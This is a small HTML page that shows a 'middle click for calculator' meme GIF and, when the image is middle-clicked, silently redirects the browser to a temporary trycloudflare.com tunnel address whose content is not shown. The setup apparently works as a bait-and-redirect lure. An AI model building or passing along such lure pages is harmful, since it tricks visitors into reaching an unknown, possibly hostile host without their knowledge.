<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Middle Click Redirect</title>
  <style>
    body {
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      background-color: #000;
    }
    img {
      cursor: pointer;
    }
  </style>
</head>
<body>
  <img id="gif" src="https://media1.tenor.com/m/NAU5DQazc8EAAAAd/middleclick-middleclick-for-calculator.gif" alt="Middle Click Me">

  <script>
    const gif = document.getElementById('gif');

    gif.addEventListener('mousedown', function (e) {
      // Middle click is button 1
      if (e.button === 1) {
        window.location.href = 'https://striking-hugo-farms-located.trycloudflare.com';
      }
    });
  </script>
</body>
</html>
